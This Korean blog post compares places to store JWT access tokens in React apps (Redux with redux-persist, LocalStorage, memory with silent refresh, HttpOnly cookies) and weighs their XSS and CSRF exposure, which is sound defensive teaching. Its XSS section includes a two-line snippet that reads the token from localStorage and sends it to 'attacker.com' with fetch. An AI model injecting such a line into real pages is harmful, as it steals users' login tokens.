---
title: "[Redux] JWT의 Access Token을 굳이 redux로 저장해야할까"
date: "2026-05-29"
description: "React 상태 관리 라이브러리 redux의 persist 사용 이유에 대해 생각해보고 기록함"
tags: ["redux", "jwt", "auth", "localstorage", "redux-persist"]
thumbnail: "https://velog.velcdn.com/images/sihoon_cho/post/4d9a7001-b20a-4238-92ae-aa3098f752b6/image.png"
---

이전 토이 프로젝트에서 JWT 사용과 관련해 Access Token을 **굳이 redux-persist를 사용해 로컬스토리지에 담는 이유**가 있냐는 질문을 받았다.

React를 사용하면서 redux를 활용하고 여러 환경에서 휘발되는 로그인 정보를 보존하기 위해 redux-persist를 사용했으나, 통상적으로 사용되는 redux + JWT 방식을 곧이곧대로 받아 사용하고 사용 이유를 생각해보지 않았던 것이 화근이었다.

각 저장 방식의 특성과 장단점을 살펴보자.

<br/>

## JWT: Access Token과 Refresh Token

JWT 인증 방식은 보통 두 가지 토큰을 함께 사용한다.

| 토큰 | 역할 | 만료 기간 |
|---|---|---|
| **Access Token** | API 요청 인증에 사용 | 짧음 (수 분 ~ 1시간) |
| **Refresh Token** | Access Token 재발급 요청에 사용 | 길음 (수 일 ~ 수 주) |

Access Token은 만료 기간이 짧아 탈취되더라도 피해가 제한적이다. Refresh Token은 만료 기간이 길기 때문에 탈취 시 위험이 크고, 그만큼 더 안전하게 보관해야 한다.

<br/>

## 저장 방식별 비교

Access Token을 어디에 저장하느냐에 따라 보안과 편의성의 트레이드오프가 달라진다.

| 저장 방식 | XSS 취약 | CSRF 취약 | 새로고침 유지 | 비고 |
|---|---|---|---|---|
| **메모리 (변수)** | 안전 | 안전 | X (휘발) | 가장 안전하나 UX 불편 |
| **LocalStorage** | 취약 | 안전 | O | 구현 단순, 보안 약점 존재 |
| **SessionStorage** | 취약 | 안전 | X (탭 닫으면 소멸) | 탭 단위 유지 |
| **HttpOnly Cookie** | 안전 | 취약 | O | Refresh Token 보관에 적합 |

<br/>

## AccessToken을 LocalStorage에 저장하는 이유

LocalStorage는 다음과 같은 장점을 가진다.

<br/>

### 1. CSRF 공격에 안전하다

CSRF(Cross-Site Request Forgery)는 공격자가 피해자의 브라우저를 이용해 **피해자도 모르게 서버에 요청을 보내는 공격**이다.

```
1. 피해자가 은행 사이트에 로그인 (쿠키에 세션 저장됨)
2. 공격자가 만든 악성 페이지 접속
3. 악성 페이지가 몰래 은행 서버에 송금 요청 전송
4. 브라우저가 쿠키를 자동 첨부 → 서버는 정상 요청으로 처리
```

Cookie는 브라우저가 요청 시 자동으로 포함시키기 때문에 이런 공격에 노출된다. 반면 LocalStorage에 저장하면 JS 코드를 통해 헤더에 직접 포함시켜야 하므로, 악성 사이트에서 자동으로 토큰이 딸려가지 않는다.

즉, 서버 요청을 조작하는 CSRF 공격으로부터 비교적 안전하다.

<br/>

### 2. 탭을 닫아도 사라지지 않는다

Web API인 LocalStorage는 SessionStorage와 달리 앱이나 탭을 닫아도 데이터를 유지한다.

이를 통해 사용자는 탭을 닫아도 로그인 상태를 유지할 수 있으며, 사용자 경험과 편의성 향상에 도움이 된다.

<br/>

### LocalStorage의 한계: XSS 취약점

그러나 공격자가 LocalStorage에 접근하는 JS 코드를 삽입한다면(XSS 공격), 토큰 탈취 위험이 생기고 API 호출 위조가 가능해진다.

```js
// XSS 공격 예시 — 악성 스크립트가 삽입된 경우
const token = localStorage.getItem("accessToken");
fetch("https://attacker.com/steal?token=" + token);
```

따라서 가장 합리적인 방식은 아래와 같다.

- **Refresh Token** → `Secure HttpOnly 쿠키`에 저장 (JS 접근 불가)
- **Access Token** → 메모리 또는 LocalStorage에 저장, API 요청 시 헤더에 첨부

<br/>

## JWT 토큰을 Redux store에 저장하는 건 어떨까

다음은 StackOverFlow의 관련 질문 답변 내용이다.

![StackOverflow - 클라이언트 저장 장소는 상관없다](/assets/React/jwt-access-token/stackoverflow-jwt-clientside.png)

> 클라이언트 측에 저장만 한다면 장소는 상관없다. XSS 공격으로 악성 코드가 침투된다면 안전한 곳은 거기서 거기기 때문이다. 유저가 저장 내용을 서로 주고받게만 못하게 하고 다른 보안 방법을 더 찾아봐라.

<br/>

![StackOverflow - Redux에 저장해도 되는가](/assets/React/jwt-access-token/stackoverflow-jwt-redux.png)

Redux에 저장해도 된다. 그러나 다음 사항을 생각해봐라.

- 새로고침될 때 JWT가 사라지는 경우, 서버에서 다시 요청해야 하는데 어떻게 다시 가져오려고?

JWT는 쿠키든 로컬스토리지든 만료 기간을 정하는 등 정석만 따른다면 문제가 없다. 개인적으론 쿠키가 더 좋아 보이더라.

> 새로고침 시 휘발 방지를 위해 **`redux-persist`** 를 사용하면 store의 내용을 로컬스토리지에 유지할 수 있다.

[Is Redux a secure place to store JWT tokens?](https://stackoverflow.com/questions/44169841/is-redux-a-secure-place-to-store-jwt-tokens)

<br/>

## 더 나은 방법: 메모리 저장 + Silent Refresh

보안을 더 중시한다면 Access Token을 **메모리(JS 변수)에만 저장**하는 방식이 있다.

메모리에 저장하면 XSS 공격으로도 탈취가 어렵지만, 새로고침 시 토큰이 사라지는 문제가 생긴다. 이를 해결하기 위해 **Silent Refresh** 패턴을 함께 사용한다.

```
1. 로그인 → Access Token(메모리) + Refresh Token(HttpOnly 쿠키) 저장
2. 새로고침 → Access Token 소멸
3. 앱 초기화 시 Refresh Token으로 Access Token 재발급 요청
4. 새 Access Token을 메모리에 저장 후 정상 동작
```

```ts
// 메모리 저장 예시
let accessToken: string | null = null;

export const setAccessToken = (token: string) => {
  accessToken = token;
};

export const getAccessToken = () => accessToken;
```

```ts
// axios interceptor로 모든 요청에 자동 첨부
axiosInstance.interceptors.request.use((config) => {
  const token = getAccessToken();
  if (token) {
    config.headers.Authorization = `Bearer ${token}`;
  }
  return config;
});

// 401 응답 시 Refresh Token으로 자동 재발급
axiosInstance.interceptors.response.use(
  (response) => response,
  async (error) => {
    if (error.response?.status === 401) {
      const { accessToken: newToken } = await reissueToken();
      setAccessToken(newToken);
      return axiosInstance(error.config);
    }
    return Promise.reject(error);
  }
);
```

이 패턴은 구현 복잡도가 올라가지만, 보안과 사용자 경험을 동시에 챙길 수 있다.

<br/>

## 결론

결국 내가 했던 방식은 redux store 내부에 Access Token을 저장하고, 이를 지속시키기 위해 redux-persist로 LocalStorage에 저장하는 방식이었다.

그러나 어차피 Access Token이 LocalStorage에 노출되는 건 동일하므로, **굳이 redux store를 거칠 필요가 없다.**

최종적으로 redux store를 통하지 않고 곧바로 LocalStorage에 저장하는 방식으로 전환했다.

각 방식을 정리하면 다음과 같다.

| 방식 | 보안 | 편의성 | 권장 여부 |
|---|---|---|---|
| Redux store → LocalStorage (redux-persist) | 낮음 | 높음 | 비권장 (불필요한 우회) |
| LocalStorage 직접 저장 | 낮음 | 높음 | 단순한 프로젝트에서는 무방 |
| 메모리 저장 + Silent Refresh | 높음 | 중간 | 실무 권장 |
| HttpOnly 쿠키 (Access + Refresh 모두) | 높음 | 높음 | CSRF 방어 추가 시 권장 |

"어디에 저장할까"보다 중요한 건 **XSS 방어**다. 입력값 검증, CSP 헤더 설정 등 XSS 자체를 막는 것이 토큰 저장 위치보다 근본적인 해결책이다.
